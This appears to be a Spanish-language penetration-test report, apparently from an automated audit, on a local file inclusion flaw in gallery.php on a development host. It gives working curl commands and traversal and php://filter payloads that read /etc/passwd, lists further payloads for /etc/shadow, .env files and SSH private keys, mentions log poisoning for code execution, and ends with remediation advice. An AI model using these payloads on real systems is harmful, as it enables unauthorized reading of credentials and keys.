# Informe de auditoría LFI

Fecha: 2026-04-18T08:12:45
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
- Vulnerabilidad encontrada: Local File Inclusion (LFI) en gallery.php parámetro `page`.
- Estado: fichero `/etc/passwd` leído exitosamente.

Evidencia y comandos ejecutados
1) Ver detección básica (curl):
- curl -sS -D /tmp/headers.txt -o /tmp/home.html http://web.dev.local:8081

2) Pruebas LFI realizadas:
- curl -sS -o /tmp/lfi1.txt 'http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd'
  -> Resultado: contenido de /etc/passwd incluido en la respuesta (ej. "root:x:0:0:root:/root:/bin/bash").

- curl -sS -o /tmp/lfi2.txt 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd'
  -> Resultado: intento de php://filter; la página devolvió base64 del /etc/passwd (útil si la salida está filtrada/parseada).

- curl -sS -o /tmp/lfi3.txt 'http://web.dev.local:8081/gallery.php?page=/etc/passwd'
  -> Resultado: aplicación intenta mapear a pages//etc/passwd.php -> no directo, pero traversal sí funcionó.

Payloads que confirmaron LFI
- ../../../../../../etc/passwd
- php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd

Confirmación de explotación
- Se obtuvo contenido de /etc/passwd desde la aplicación web, lo que demuestra que el LFI permite acceder a archivos sensibles del sistema.
- Por lo tanto se marca VULN_FOUND: true y VULN_EXPLOITED: true.

Impacto
- Divulgación de usuarios del sistema y potencial enumeración de cuentas (incluyendo www-data).
- Desde aquí es factible buscar /etc/shadow, claves privadas en /root/.ssh/id_rsa o configuraciones en /var/www, y potencialmente escalar a RCE mediante técnicas como log poisoning o incluyendo wrappers que ejecuten código si la configuración PHP lo permite.

Técnicas y payloads adicionales útiles
- Lectura binaria/evitar parseo: php://filter/read=convert.base64-encode/resource=/path/to/file
- Intento de lectura de shadow (si permisos lo permiten): ../../../../../../etc/shadow
- Lectura de ficheros de configuración: ../../../../../../var/www/.env ; ../../../../../../home/*/.ssh/id_rsa
- Log poisoning para RCE (ejemplo conceptual): inyectar contenido PHP en logs accesibles por la aplicación y apuntar el include al log file.

Recomendaciones
1) Validar y normalizar el parámetro `page`: permitir solo valores desde una lista blanca (modern, classic, abstract, about).
2) Evitar incluir archivos directamente desde entrada del usuario. Usar mapeo fijo de rutas.
3) Usar realpath() y verificar que el archivo resuelto esté dentro del directorio esperado.
4) Deshabilitar wrappers peligrosos y `allow_url_include` en php.ini, y restringir `open_basedir`.
5) Revisar permisos de ficheros: /etc/shadow y claves privadas no deben ser legibles por el proceso web.
6) Auditar logs por actividad sospechosa y rotar credenciales si se detecta exfiltración.

Anexos
- Comandos exactos ejecutados y archivos temporales generados: /tmp/lfi1.txt, /tmp/lfi2.txt, /tmp/lfi3.txt
- Recomiendo ejecutar un escaneo adicional con ffuf para encontrar otros parámetros:
  ffuf -u http://web.dev.local:8081/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

Fin del informe.
